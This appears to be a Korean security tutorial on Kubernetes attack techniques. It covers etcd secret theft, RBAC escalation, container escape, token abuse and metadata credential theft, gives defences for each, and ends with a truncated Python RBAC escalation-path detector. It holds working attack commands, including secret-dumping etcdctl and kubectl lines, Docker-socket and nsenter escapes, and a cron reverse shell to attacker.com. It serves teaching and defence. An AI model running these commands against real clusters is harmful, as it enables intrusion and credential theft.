> 🌐 **Language / 언어**: [🇰🇷 한국어](#한국어) | [🇺🇸 English](#english)

---

<a name="한국어"></a>

# Cloud Native 공격 기법

## 0. 초보자를 위한 개념 이해

### Cloud Native 공격 기법이란?

Cloud Native 공격 기법은 Kubernetes 클러스터, 컨테이너 환경, 클라우드 인프라를 목표로 하는 특화된 공격 방법론이다. 전통적인 서버 해킹과 달리 API 서버, RBAC 권한 오용, 서비스 어카운트 토큰, etcd 직접 접근 등 컨테이너 오케스트레이션 고유의 공격 경로가 존재한다. 이를 이해해야 클러스터를 안전하게 설계하고 침투 테스트를 수행할 수 있다.

**왜 배우는가:**
```
[Kubernetes 클러스터 침해 시나리오]

  공격자가 취약한 웹앱 컨테이너 침해
           ↓
  서비스 어카운트 토큰 획득
  (/var/run/secrets/kubernetes.io/serviceaccount/token)
           ↓
  kubectl API 호출로 클러스터 정보 수집
           ↓
  RBAC 과도한 권한 발견
  (예: default SA에 cluster-admin 부여)
           ↓
  etcd 직접 접근 → 모든 시크릿 평문 탈취
           ↓
  ★ 전체 클러스터 장악, 클라우드 자격증명 획득
```

### 핵심 개념 정리

```
[주요 Cloud Native 공격 기법]

1. etcd 직접 접근
   etcd 포트(2379) 직접 접근 시 모든 시크릿 평문 열람
   대응: TLS 상호 인증, 네트워크 격리

2. RBAC 에스컬레이션
   wildcard 권한(*), pods/exec 권한 오용
   대응: 최소 권한 원칙, 주기적 권한 감사

3. 컨테이너 탈출
   특권 컨테이너(privileged: true) → 호스트 파일시스템 마운트
   hostPID/hostNetwork → 호스트 프로세스/네트워크 접근
   대응: PodSecurityAdmission, seccomp, AppArmor

4. 서비스 어카운트 토큰 악용
   모든 Pod에 자동 마운트되는 JWT 토큰
   대응: automountServiceAccountToken: false 기본 설정

5. 이미지 풀 공격
   악성 이미지를 신뢰하는 레지스트리에 업로드
   대응: 이미지 서명(Cosign), admission webhook
```

### 필요한 도구 및 환경
- **kubectl**: Kubernetes CLI (`kubectl auth can-i --list`)
- **kube-hunter**: Kubernetes 침투 테스트 자동화 도구
- **etcdctl**: etcd 직접 접근 CLI 도구
- **Minikube**: 로컬 테스트 클러스터 (실습 환경)

### 기초 실습 예제
```python
import subprocess
import json
import base64

def check_service_account_permissions(namespace: str = "default") -> list[dict]:
    """
    현재 서비스 어카운트의 RBAC 권한을 확인한다.
    컨테이너 내부에서 실행 시 마운트된 토큰으로 자동 인증.
    """
    findings = []

    # 위험한 권한 조합 목록
    dangerous_verbs = {
        ("*", "*"): "CRITICAL - 모든 리소스 모든 작업 가능",
        ("create", "pods"): "HIGH - Pod 생성 (특권 컨테이너 배포 가능)",
        ("exec", "pods"): "HIGH - Pod 내 명령 실행",
        ("get", "secrets"): "HIGH - 시크릿 열람",
        ("create", "clusterrolebindings"): "CRITICAL - 권한 에스컬레이션",
        ("update", "clusterroles"): "CRITICAL - 역할 변조",
    }

    try:
        # 현재 SA의 권한 목록 조회
        result = subprocess.run(
            ['kubectl', 'auth', 'can-i', '--list',
             '-n', namespace],
            capture_output=True, text=True, timeout=10
        )

        print(f"[*] 네임스페이스 '{namespace}'의 현재 권한:")
        for line in result.stdout.split('\n')[1:]:  # 헤더 제외
            if not line.strip():
                continue
            parts = line.split()
            if parts:
                resources = parts[0] if len(parts) > 0 else ""
                verbs = parts[2] if len(parts) > 2 else ""

                if verbs == '[*]' or 'create' in verbs or 'delete' in verbs:
                    print(f"  [!] {resources}: {verbs}")
                    findings.append({
                        "리소스": resources,
                        "동사": verbs,
                        "네임스페이스": namespace
                    })

    except FileNotFoundError:
        print("[-] kubectl 없음")
    except Exception as e:
        print(f"[-] 오류: {e}")

    return findings

# 사용 예시 (테스트 클러스터에서)
# check_service_account_permissions("default")
```

---

## 목차
1. etcd 직접 접근 공격 (Kubernetes 시크릿 탈취)
2. RBAC 남용 (ClusterAdmin 에스컬레이션)
3. 컨테이너 탈출 후 노드 장악
4. 서비스 어카운트 토큰 악용
5. Kubernetes API 서버 익스플로잇 사례
6. Python: RBAC 권한 에스컬레이션 경로 탐지 도구

---

## 1. etcd 직접 접근 공격 (Kubernetes 시크릿 탈취)

### etcd란?

etcd는 Kubernetes의 분산 키-값 저장소로, 클러스터의 모든 상태 정보를 저장합니다.
시크릿, ConfigMap, Pod 설정 등 모든 Kubernetes 리소스가 여기에 저장됩니다.

```
Kubernetes 클러스터 데이터 흐름:
kubectl → kube-apiserver → etcd (영구 저장)
                         ↓
                    모든 시크릿, 토큰, 인증서 저장
```

### 공격 시나리오 1: etcd 포트 노출

```bash
# 취약한 설정: etcd가 외부에 노출된 경우 (2379/tcp)
# 공격자가 etcd에 직접 접근하여 시크릿 탈취

# etcd 클라이언트 설치
export ETCDCTL_API=3

# 모든 키 나열
etcdctl --endpoints=http://<etcd-ip>:2379 get / --prefix --keys-only

# Kubernetes 시크릿 경로
etcdctl --endpoints=http://<etcd-ip>:2379 \
  get /registry/secrets/default/db-password

# 결과 디코딩 (Base64 인코딩된 값)
etcdctl ... | base64 -d
```

**탐지된 데이터 구조**:
```
/registry/secrets/{namespace}/{secret-name}
/registry/serviceaccounts/{namespace}/{sa-name}
/registry/configmaps/{namespace}/{cm-name}
/registry/pods/{namespace}/{pod-name}
```

### 공격 시나리오 2: 클라이언트 인증서로 접근

```bash
# Control plane에 접근한 경우 인증서를 이용한 etcd 접근
etcdctl --endpoints=https://127.0.0.1:2379 \
  --cacert=/etc/kubernetes/pki/etcd/ca.crt \
  --cert=/etc/kubernetes/pki/etcd/healthcheck-client.crt \
  --key=/etc/kubernetes/pki/etcd/healthcheck-client.key \
  get /registry/secrets/ --prefix --keys-only

# 특정 시크릿 탈취
etcdctl --endpoints=https://127.0.0.1:2379 \
  --cacert=/etc/kubernetes/pki/etcd/ca.crt \
  --cert=/etc/kubernetes/pki/etcd/healthcheck-client.crt \
  --key=/etc/kubernetes/pki/etcd/healthcheck-client.key \
  get /registry/secrets/kube-system/bootstrap-token-abcdef
```

### 방어 방법

```yaml
# 1. etcd 암호화 설정 (EncryptionConfiguration)
apiVersion: apiserver.config.k8s.io/v1
kind: EncryptionConfiguration
resources:
- resources:
  - secrets
  - configmaps
  providers:
  - aescbc:
      keys:
      - name: key1
        secret: <base64-encoded-32-byte-key>
  - identity: {}  # 암호화되지 않은 리소스 읽기 허용 (마이그레이션용)
```

```bash
# 2. etcd 네트워크 격리
# etcd는 오직 kube-apiserver만 접근 가능하도록 방화벽 설정
iptables -A INPUT -p tcp --dport 2379 -s <kube-apiserver-ip> -j ACCEPT
iptables -A INPUT -p tcp --dport 2379 -j DROP

# 3. etcd 백업 암호화
etcdctl snapshot save snapshot.db
gpg --symmetric --cipher-algo AES256 snapshot.db
```

---

## 2. RBAC 남용 (ClusterAdmin 에스컬레이션)

### Kubernetes RBAC 기본 구조

```
RBAC 구성 요소:
├── Role/ClusterRole      - 권한 집합 정의
├── RoleBinding           - Role을 사용자/그룹/SA에 바인딩 (네임스페이스)
└── ClusterRoleBinding    - ClusterRole을 전역으로 바인딩
```

### 에스컬레이션 경로 1: 과도한 동사(Verb) 권한

```yaml
# 위험한 Role: ClusterRole 생성 및 바인딩 권한
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata:
  name: "dangerous-role"
rules:
- apiGroups: ["rbac.authorization.k8s.io"]
  resources: ["clusterroles", "clusterrolebindings"]
  verbs: ["create", "update", "patch"]  # 이 권한으로 ClusterAdmin 생성 가능!
```

**공격**:
```bash
# 공격자가 dangerous-role을 가진 경우
# 새로운 ClusterAdmin 바인딩 생성
kubectl create clusterrolebinding pwned \
  --clusterrole=cluster-admin \
  --serviceaccount=default:compromised-sa
```

### 에스컬레이션 경로 2: Pods/Exec 권한

```yaml
# pods/exec 권한 → 임의 Pod에서 명령 실행
rules:
- apiGroups: [""]
  resources: ["pods/exec"]
  verbs: ["create"]
```

**공격**:
```bash
# 특권 컨테이너가 있는 Pod에 exec
kubectl exec -it privileged-pod -- /bin/bash
# 컨테이너 탈출 후 노드 접근
```

### 에스컬레이션 경로 3: Secrets 읽기 권한

```yaml
# secrets를 읽을 수 있으면 서비스 어카운트 토큰 탈취 가능
rules:
- apiGroups: [""]
  resources: ["secrets"]
  verbs: ["get", "list"]
```

**공격**:
```bash
# 모든 시크릿 나열
kubectl get secrets -A

# kube-system의 서비스 어카운트 토큰 탈취
kubectl get secret -n kube-system \
  $(kubectl get sa -n kube-system -o jsonpath='{.items[0].secrets[0].name}') \
  -o jsonpath='{.data.token}' | base64 -d
```

### 에스컬레이션 경로 4: Node Proxy 권한

```yaml
# nodes/proxy 권한으로 kubelet API 직접 접근
rules:
- apiGroups: [""]
  resources: ["nodes/proxy"]
  verbs: ["get", "create"]
```

**공격**:
```bash
# kubelet API를 통해 노드에서 명령 실행
kubectl get --raw /api/v1/nodes/<node-name>/proxy/exec?command=id&container=<container>
```

### 에스컬레이션 경로 5: MutatingWebhookConfiguration 수정

```yaml
# Admission Webhook 수정 → 모든 Pod 생성 시 악성 사이드카 주입
rules:
- apiGroups: ["admissionregistration.k8s.io"]
  resources: ["mutatingwebhookconfigurations"]
  verbs: ["create", "update", "patch"]
```

### RBAC 강화 권고

```yaml
# 안전한 Role 예시: 최소 권한 원칙
apiVersion: rbac.authorization.k8s.io/v1
kind: Role
metadata:
  namespace: production
  name: app-reader
rules:
# 특정 리소스만, 특정 동사만
- apiGroups: [""]
  resources: ["pods", "services"]
  verbs: ["get", "list", "watch"]
  # resourceNames: ["specific-pod"]  # 특정 리소스만 허용 가능

---
# 금지해야 할 위험한 권한 조합
# - secrets + (get/list/watch)
# - clusterroles/clusterrolebindings + (create/update/patch/bind)
# - pods/exec + create
# - nodes/proxy + (get/create)
# - * (와일드카드) + * 의 조합
```

---

## 3. 컨테이너 탈출 후 노드 장악

### 탈출 기법 1: Privileged Container 악용

```bash
# 특권 컨테이너에서 호스트 파일시스템 마운트
ls /dev/  # 호스트 장치 목록 확인
mount /dev/xvda1 /mnt  # 호스트 루트 파티션 마운트

# 호스트에 크론탭 등록 (지속성 확보)
echo "* * * * * root bash -i >& /dev/tcp/attacker.com/4444 0>&1" \
  >> /mnt/etc/cron.d/backdoor

# chroot로 호스트 환경 진입
chroot /mnt /bin/bash
```

### 탈출 기법 2: hostPID + nsenter

```bash
# hostPID: true 설정된 컨테이너에서
# 호스트의 PID 1(init)로 nsenter를 통해 네임스페이스 전환
nsenter --target 1 --mount --uts --ipc --net --pid -- bash

# 이제 호스트 환경에 있음
whoami  # root
hostname  # 호스트 이름
```

### 탈출 기법 3: Docker socket 마운트

```bash
# /var/run/docker.sock이 마운트된 경우
ls /var/run/docker.sock  # 소켓 확인

# Docker API를 통해 특권 컨테이너 생성
curl -s --unix-socket /var/run/docker.sock \
  -H "Content-Type: application/json" \
  -d '{"Image":"ubuntu","Cmd":["/bin/bash"],"HostConfig":{"Binds":["/:/host"],"Privileged":true}}' \
  http://localhost/containers/create

# 또는 docker CLI 사용
docker run -v /:/host --privileged --rm -it ubuntu \
  chroot /host bash
```

### 탈출 기법 4: runc CVE-2019-5736

```
CVE-2019-5736 (Runc 컨테이너 탈출):
1. 공격자가 컨테이너 내부에서 /proc/self/exe 덮어쓰기
2. runc 바이너리가 컨테이너 내 실행 파일로 교체됨
3. 다음 번 runc 실행 시 (exec 또는 새 컨테이너 시작) 악성 코드 실행
영향: runc 1.0-rc6 이하 버전
```

### 탈출 기법 5: Kernel Exploit (Dirty Cow 등)

```bash
# 컨테이너는 호스트 커널을 공유하므로
# 커널 취약점을 이용한 권한 상승이 호스트까지 영향

# 커널 버전 확인
uname -r

# 알려진 취약점:
# CVE-2016-5195 (Dirty COW) - 커널 4.8 이전
# CVE-2022-0847 (Dirty Pipe) - 커널 5.16.11 이전
# CVE-2022-0185 - 파일시스템 컨텍스트 API 취약점
```

### 노드 장악 후 행동

```bash
# 노드에서 클러스터 전체 접근
# 1. kubelet 인증서로 API 서버 접근
ls /var/lib/kubelet/pki/
export KUBECONFIG=/etc/kubernetes/kubelet.conf

# 2. 모든 Pod의 서비스 어카운트 토큰 수집
find /var/lib/kubelet/pods -name "token" -exec cat {} \;

# 3. kube-system 시크릿 접근
kubectl get secrets -n kube-system
```

---

## 4. 서비스 어카운트 토큰 악용

### 기본 토큰 위치

```bash
# Pod 내부에서 자동 마운트된 토큰 위치
cat /var/run/secrets/kubernetes.io/serviceaccount/token
cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt
cat /var/run/secrets/kubernetes.io/serviceaccount/namespace
```

### 토큰을 이용한 API 서버 접근

```bash
# 환경 변수 설정
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
API_SERVER="https://kubernetes.default.svc"
NAMESPACE=$(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace)

# 현재 권한 확인
curl -s -k \
  -H "Authorization: Bearer $TOKEN" \
  "$API_SERVER/api/v1/namespaces/$NAMESPACE/pods"

# 모든 네임스페이스 시크릿 접근 시도
curl -s -k \
  -H "Authorization: Bearer $TOKEN" \
  "$API_SERVER/api/v1/secrets"

# 권한 확인 (self-subject-access-review)
curl -s -k \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"apiVersion":"authorization.k8s.io/v1","kind":"SelfSubjectAccessReview","spec":{"resourceAttributes":{"verb":"list","resource":"secrets"}}}' \
  "$API_SERVER/apis/authorization.k8s.io/v1/selfsubjectaccessreviews"
```

### 투영된 토큰(Projected Token) 악용

```yaml
# 서비스 어카운트 토큰 투영 설정
apiVersion: v1
kind: Pod
spec:
  volumes:
  - name: token
    projected:
      sources:
      - serviceAccountToken:
          path: token
          expirationSeconds: 86400  # 1일 (짧을수록 안전)
          audience: "api"
```

**방어**:
```yaml
# automountServiceAccountToken 비활성화
apiVersion: v1
kind: ServiceAccount
metadata:
  name: my-sa
automountServiceAccountToken: false  # 서비스 어카운트 레벨

---
# Pod 레벨에서도 비활성화
spec:
  automountServiceAccountToken: false
```

---

## 5. Kubernetes API 서버 익스플로잇 사례

### 사례 1: 인증 없는 API 서버 노출 (CVE-2018-1002105)

```
CVE-2018-1002105: Kubernetes Privilege Escalation
- 영향 버전: Kubernetes 1.10 이하, 1.11.x < 1.11.5, 1.12.x < 1.12.3
- 취약점: aggregated API 서버로의 요청 업그레이드 시 인증 헤더 유지
- 공격: 낮은 권한으로 임의 API 엔드포인트 접근 가능
- 심각도: CVSS 9.8 (Critical)

공격 흐름:
1. pods/exec 또는 pods/portforward 권한 보유
2. 요청을 aggregated API로 업그레이드
3. 인증 헤더가 유지되어 cluster-admin 수준 접근 획득
```

### 사례 2: Kubernetes Dashboard 무인증 노출

```bash
# 취약한 설정: skip-login 플래그 활성화
# kubectl proxy 또는 직접 노출
kubectl proxy --port=8001 &
# http://localhost:8001/api/v1/namespaces/kubernetes-dashboard/services/
# https:kubernetes-dashboard:/proxy/#!/overview?namespace=_all

# 실제 사례: 2019년 Tesla 쿠버네티스 대시보드 무인증 노출
# → 암호화폐 채굴 악성코드 배포
```

### 사례 3: kubelet API 무인증 노출 (10250/tcp)

```bash
# 인증 없는 kubelet API 접근
# /pods: 노드의 모든 Pod 목록
curl -k https://<node-ip>:10250/pods

# /exec: 컨테이너 내 명령 실행 (Websocket)
# 이전 버전에서는 인증 없이 exec 가능
curl -k https://<node-ip>:10250/exec/<ns>/<pod>/<container> \
  -d "command=ls&command=-la&input=1&output=1&tty=1"

# /run: 컨테이너 내 명령 실행
curl -k https://<node-ip>:10250/run/<ns>/<pod>/<container> \
  -d "cmd=id"
```

### 사례 4: SSRF를 통한 메타데이터 API 접근

```bash
# 컨테이너 내에서 클라우드 메타데이터 API 접근
# AWS IMDSv1 (취약 버전)
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/

# GCP 메타데이터 API
curl -H "Metadata-Flavor: Google" \
  http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token

# Azure 메타데이터 API
curl -H "Metadata: true" \
  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"
```

---

## 6. Python: RBAC 권한 에스컬레이션 경로 탐지 도구

```python
#!/usr/bin/env python3
"""
Kubernetes RBAC 권한 에스컬레이션 경로 탐지 도구

Kubernetes 클러스터의 RBAC 설정을 분석하여
권한 에스컬레이션이 가능한 경로를 탐지합니다.
"""

import argparse
import json
import subprocess
import sys
from collections import defaultdict
from concurrent.futures import ThreadPoolExecutor, as_completed
from dataclasses import dataclass, field
from enum import Enum
from typing import Any


class EscalationRisk(Enum):
    CRITICAL = "CRITICAL"  # 직접적 cluster-admin 획득 가능
    HIGH = "HIGH"          # 간접적 권한 상승 가능
    MEDIUM = "MEDIUM"      # 잠재적 위험
    LOW = "LOW"            # 모니터링 필요


@dataclass
class EscalationPath:
    subject_name: str
    subject_kind: str
    subject_namespace: str | None
    path: list[str]
    risk: EscalationRisk
    description: str
    technique: str
    mitigation: str


@dataclass
class RBACAnalysisResult:
    cluster_admin_subjects: list[dict[str, Any]] = field(default_factory=list)
    escalation_paths: list[EscalationPath] = field(default_factory=list)
    dangerous_permissions: list[dict[str, Any]] = field(default_factory=list)
    orphaned_bindings: list[str] = field(default_factory=list)

    def summary(self) -> dict[str, Any]:
        risk_counts: dict[str, int] = {}
        for ep in self.escalation_paths:
            risk_counts[ep.risk.value] = risk_counts.get(ep.risk.value, 0) + 1
        return {
            "cluster_admin_count": len(self.cluster_admin_subjects),
            "escalation_paths": risk_counts,
            "dangerous_permissions": len(self.dangerous_permissions),
            "orphaned_bindings": len(self.orphaned_bindings),
        }


# 권한 에스컬레이션이 가능한 위험한 권한 조합
DANGEROUS_PERMISSIONS: list[dict[str, Any]] = [
    {
        "name": "secrets_read",
        "risk": EscalationRisk.HIGH,
        "api_groups": [""],
        "resources": ["secrets"],
        "verbs": ["get", "list", "watch"],
        "description": "시크릿 읽기 권한 - 서비스 어카운트 토큰 탈취 가능",
        "technique": "T1552.007 - Kubernetes Secrets",
        "mitigation": "시크릿 읽기 권한 제거, 특정 시크릿만 접근 허용",
    },
    {
        "name": "rbac_escalation",
        "risk": EscalationRisk.CRITICAL,
        "api_groups": ["rbac.authorization.k8s.io"],
        "resources": ["clusterroles", "clusterrolebindings", "roles", "rolebindings"],
        "verbs": ["create", "update", "patch", "bind", "escalate"],
        "description": "RBAC 리소스 수정 권한 - ClusterAdmin 생성 가능",
        "technique": "T1078 - Valid Accounts",
        "mitigation": "RBAC 리소스 수정 권한 제거, GitOps로 RBAC 관리",
    },
    {
        "name": "pod_exec",
        "risk": EscalationRisk.HIGH,
        "api_groups": [""],
        "resources": ["pods/exec", "pods/attach"],
        "verbs": ["create", "get"],
        "description": "Pod exec 권한 - 특권 컨테이너에서 탈출 가능",
        "technique": "T1609 - Container Administration Command",
        "mitigation": "pods/exec 권한을 특정 Pod/네임스페이스로 제한",
    },
    {
        "name": "node_proxy",
        "risk": EscalationRisk.HIGH,
        "api_groups": [""],
        "resources": ["nodes/proxy"],
        "verbs": ["get", "create"],
        "description": "노드 프록시 접근 - kubelet API 직접 접근 가능",
        "technique": "T1609 - Container Administration Command",
        "mitigation": "nodes/proxy 권한 제거",
    },
    {
        "name": "pods_create",
        "risk": EscalationRisk.HIGH,
        "api_groups": [""],
        "resources": ["pods"],
        "verbs": ["create", "update", "patch"],
        "description": "Pod 생성 권한 - 특권 Pod로 노드 접근 가능",
        "technique": "T1610 - Deploy Container",
        "mitigation": "Pod Security Standards 적용, OPA Gatekeeper로 특권 컨테이너 차단",
    },
    {
        "name": "admission_webhook",
        "risk": EscalationRisk.CRITICAL,
        "api_groups": ["admissionregistration.k8s.io"],
        "resources": [
            "mutatingwebhookconfigurations",
            "validatingwebhookconfigurations",
        ],
        "verbs": ["create", "update", "patch"],
        "description": "Webhook 수정 권한 - 모든 Pod에 악성 사이드카 주입 가능",
        "technique": "T1055 - Process Injection",
        "mitigation": "Admission Webhook 수정 권한 제거",
    },
    {
        "name": "daemonset_create",
        "risk": EscalationRisk.HIGH,
        "api_groups": ["apps"],
        "resources": ["daemonsets"],
        "verbs": ["create", "update", "patch"],
        "description": "DaemonSet 생성 권한 - 모든 노드에 악성 컨테이너 배포 가능",
        "technique": "T1610 - Deploy Container",
        "mitigation": "DaemonSet 수정 권한을 특정 네임스페이스로 제한",
    },
    {
        "name": "token_request",
        "risk": EscalationRisk.MEDIUM,
        "api_groups": [""],
        "resources": ["serviceaccounts/token"],
        "verbs": ["create"],
        "description": "서비스 어카운트 토큰 생성 권한 - 임의 SA 토큰 발급 가능",
        "technique": "T1528 - Steal Application Access Token",
        "mitigation": "특정 서비스 어카운트로 권한 제한",
    },
]


def run_kubectl_json(args: list[str]) -> dict[str, Any] | None:
    """kubectl 명령 실행 후 JSON 파싱."""
    try:
        result = subprocess.run(
            ["kubectl"] + args + ["-o", "json"],
            capture_output=True,
            text=True,
            timeout=30,
            check=True,
        )
        return json.loads(result.stdout)
    except subprocess.CalledProcessError as e:
        print(f"[경고] kubectl 오류: {e.stderr.strip()[:100]}", file=sys.stderr)
        return None
    except (json.JSONDecodeError, subprocess.TimeoutExpired):
        return None


def get_all_rbac_data() -> tuple[
    list[dict[str, Any]],
    list[dict[str, Any]],
    list[dict[str, Any]],
    list[dict[str, Any]],
]:
    """모든 RBAC 리소스 수집 (병렬)."""
    with ThreadPoolExecutor(max_workers=4) as executor:
        futures = {
            "clusterroles": executor.submit(
                run_kubectl_json, ["get", "clusterroles"]
            ),
            "clusterrolebindings": executor.submit(
                run_kubectl_json, ["get", "clusterrolebindings"]
            ),
            "roles": executor.submit(
                run_kubectl_json, ["get", "roles", "--all-namespaces"]
            ),
            "rolebindings": executor.submit(
                run_kubectl_json, ["get", "rolebindings", "--all-namespaces"]
            ),
        }
        results = {name: future.result() for name, future in futures.items()}

    def extract_items(data: dict[str, Any] | None) -> list[dict[str, Any]]:
        return data.get("items", []) if data else []

    return (
        extract_items(results["clusterroles"]),
        extract_items(results["clusterrolebindings"]),
        extract_items(results["roles"]),
        extract_items(results["rolebindings"]),
    )


def check_permission_match(
    rule: dict[str, Any], dangerous: dict[str, Any]
) -> bool:
    """규칙이 위험한 권한 조합과 일치하는지 확인."""
    rule_api_groups = set(rule.get("apiGroups", []))
    rule_resources = set(rule.get("resources", []))
    rule_verbs = set(rule.get("verbs", []))

    # 와일드카드 처리
    if "*" in rule_api_groups or "*" in rule_resources or "*" in rule_verbs:
        return True

    api_match = bool(
        set(dangerous["api_groups"]) & rule_api_groups
        or "*" in rule_api_groups
    )
    resource_match = bool(
        set(dangerous["resources"]) & rule_resources
        or "*" in rule_resources
    )
    verb_match = bool(
        set(dangerous["verbs"]) & rule_verbs
        or "*" in rule_verbs
    )

    return api_match and resource_match and verb_match


def find_cluster_admin_subjects(
    crbs: list[dict[str, Any]]
) -> list[dict[str, Any]]:
    """cluster-admin에 바인딩된 주체 탐지."""
    admins: list[dict[str, Any]] = []
    for binding in crbs:
        role_ref = binding.get("roleRef", {})
        if role_ref.get("name") == "cluster-admin":
            for subject in binding.get("subjects", []):
                admins.append({
                    "binding_name": binding["metadata"]["name"],
                    "subject_kind": subject.get("kind"),
                    "subject_name": subject.get("name"),
                    "subject_namespace": subject.get("namespace"),
                })
    return admins


def find_dangerous_role_permissions(
    clusterroles: list[dict[str, Any]],
    roles: list[dict[str, Any]],
) -> list[dict[str, Any]]:
    """위험한 권한을 가진 Role/ClusterRole 탐지."""
    dangerous_roles: list[dict[str, Any]] = []
    all_roles = [
        (r, "ClusterRole", None) for r in clusterroles
    ] + [
        (r, "Role", r["metadata"].get("namespace")) for r in roles
    ]

    for role, kind, namespace in all_roles:
        role_name = role["metadata"]["name"]
        matched_dangers: list[dict[str, Any]] = []
        for rule in role.get("rules", []):
            for dangerous in DANGEROUS_PERMISSIONS:
                if check_permission_match(rule, dangerous):
                    matched_dangers.append(dangerous)
        if matched_dangers:
            dangerous_roles.append({
                "role_kind": kind,
                "role_name": role_name,
                "namespace": namespace,
                "dangers": matched_dangers,
            })

    return dangerous_roles


def find_escalation_paths(
    dangerous_roles: list[dict[str, Any]],
    crbs: list[dict[str, Any]],
    rbs: list[dict[str, Any]],
) -> list[EscalationPath]:
    """RBAC 에스컬레이션 경로 탐지."""
    paths: list[EscalationPath] = []

    # Role 이름 → 위험 정보 매핑
    role_danger_map: dict[str, dict[str, Any]] = {}
    for dr in dangerous_roles:
        key = f"{dr['role_kind']}/{dr['role_name']}"
        role_danger_map[key] = dr

    # ClusterRoleBinding 분석
    for binding in crbs:
        role_ref = binding.get("roleRef", {})
        role_key = f"ClusterRole/{role_ref.get('name', '')}"
        if role_key not in role_danger_map:
            continue

        dr = role_danger_map[role_key]
        binding_name = binding["metadata"]["name"]

        for subject in binding.get("subjects", []):
            for danger in dr["dangers"]:
                paths.append(
                    EscalationPath(
                        subject_name=subject.get("name", ""),
                        subject_kind=subject.get("kind", ""),
                        subject_namespace=subject.get("namespace"),
                        path=[
                            f"{subject.get('kind')}/{subject.get('name')}",
                            f"ClusterRoleBinding/{binding_name}",
                            f"ClusterRole/{role_ref.get('name')}",
                            f"Permission: {danger['name']}",
                        ],
                        risk=danger["risk"],
                        description=danger["description"],
                        technique=danger["technique"],
                        mitigation=danger["mitigation"],
                    )
                )

    # RoleBinding 분석
    for binding in rbs:
        role_ref = binding.get("roleRef", {})
        namespace = binding["metadata"].get("namespace", "")
        role_kind = role_ref.get("kind", "Role")
        role_key = f"{role_kind}/{role_ref.get('name', '')}"
        if role_key not in role_danger_map:
            continue

        dr = role_danger_map[role_key]
        binding_name = binding["metadata"]["name"]

        for subject in binding.get("subjects", []):
            for danger in dr["dangers"]:
                paths.append(
                    EscalationPath(
                        subject_name=subject.get("name", ""),
                        subject_kind=subject.get("kind", ""),
                        subject_namespace=subject.get("namespace") or namespace,
                        path=[
                            f"{subject.get('kind')}/{subject.get('name')}",
                            f"RoleBinding/{namespace}/{binding_name}",
                            f"{role_kind}/{role_ref.get('name')}",
                            f"Permission: {danger['name']}",
                        ],
                        risk=danger["risk"],
                        description=danger["description"],
                        technique=danger["technique"],
                        mitigation=danger["mitigation"],
                    )
                )

    return paths


def find_orphaned_bindings(
    crbs: list[dict[str, Any]],
    rbs: list[dict[str, Any]],
    clusterroles: list[dict[str, Any]],
    roles: list[dict[str, Any]],
) -> list[str]:
    """참조하는 Role이 없는 고아 바인딩 탐지."""
    orphaned: list[str] = []
    cr_names = {r["metadata"]["name"] for r in clusterroles}
    role_names = {
        f"{r['metadata']['namespace']}/{r['metadata']['name']}"
        for r in roles
    }

    for binding in crbs:
        role_ref = binding.get("roleRef", {})
        if role_ref.get("kind") == "ClusterRole":
            if role_ref.get("name") not in cr_names:
                orphaned.append(
                    f"ClusterRoleBinding/{binding['metadata']['name']} → "
                    f"ClusterRole/{role_ref.get('name')} (존재하지 않음)"
                )

    for binding in rbs:
        role_ref = binding.get("roleRef", {})
        ns = binding["metadata"].get("namespace", "")
        role_key = f"{ns}/{role_ref.get('name', '')}"
        if role_ref.get("kind") == "Role" and role_key not in role_names:
            orphaned.append(
                f"RoleBinding/{ns}/{binding['metadata']['name']} → "
                f"Role/{role_ref.get('name')} (존재하지 않음)"
            )

    return orphaned


def analyze_rbac() -> RBACAnalysisResult:
    """RBAC 전체 분석 실행."""
    print("[정보] RBAC 데이터 수집 중...", file=sys.stderr)
    clusterroles, crbs, roles, rbs = get_all_rbac_data()

    print(
        f"[정보] 수집 완료 - ClusterRole: {len(clusterroles)}, "
        f"CRB: {len(crbs)}, Role: {len(roles)}, RB: {len(rbs)}",
        file=sys.stderr,
    )

    result = RBACAnalysisResult()

    # 병렬로 분석 실행
    with ThreadPoolExecutor(max_workers=4) as executor:
        futures = {
            "cluster_admin": executor.submit(find_cluster_admin_subjects, crbs),
            "dangerous_roles": executor.submit(
                find_dangerous_role_permissions, clusterroles, roles
            ),
            "orphaned": executor.submit(
                find_orphaned_bindings, crbs, rbs, clusterroles, roles
            ),
        }

        analysis_results = {}
        for name, future in futures.items():
            try:
                analysis_results[name] = future.result()
            except Exception as e:
                print(f"[경고] {name} 분석 실패: {e}", file=sys.stderr)
                analysis_results[name] = []

    result.cluster_admin_subjects = analysis_results.get("cluster_admin", [])
    result.dangerous_permissions = analysis_results.get("dangerous_roles", [])
    result.orphaned_bindings = analysis_results.get("orphaned", [])

    # 에스컬레이션 경로는 dangerous_roles 결과를 사용
    result.escalation_paths = find_escalation_paths(
        result.dangerous_permissions, crbs, rbs
    )

    print(
        f"[정보] 분석 완료 - 에스컬레이션 경로: {len(result.escalation_paths)}개",
        file=sys.stderr,
    )
    return result


def print_rbac_report(result: RBACAnalysisResult, fmt: str) -> None:
    """RBAC 분석 결과 출력."""
    if fmt == "json":
        report = {
            "summary": result.summary(),
            "cluster_admin_subjects": result.cluster_admin_subjects,
            "escalation_paths": [
                {
                    "subject": f"{ep.subject_kind}/{ep.subject_name}",
                    "namespace": ep.subject_namespace,
                    "risk": ep.risk.value,
                    "path": ep.path,
                    "description": ep.description,
                    "technique": ep.technique,
                    "mitigation": ep.mitigation,
                }
                for ep in result.escalation_paths
            ],
            "orphaned_bindings": result.orphaned_bindings,
        }
        print(json.dumps(report, ensure_ascii=False, indent=2))
        return

    # 텍스트 보고서
    print("\n" + "=" * 70)
    print("  Kubernetes RBAC 권한 에스컬레이션 분석 결과")
    print("=" * 70)
    summary = result.summary()
    print(f"  cluster-admin 바인딩: {summary['cluster_admin_count']}개")
    print(f"  에스컬레이션 경로: {json.dumps(summary['escalation_paths'], ensure_ascii=False)}")
    print(f"  고아 바인딩: {summary['orphaned_bindings']}개")

    print("\n[cluster-admin 바인딩]")
    if result.cluster_admin_subjects:
        for admin in result.cluster_admin_subjects:
            print(
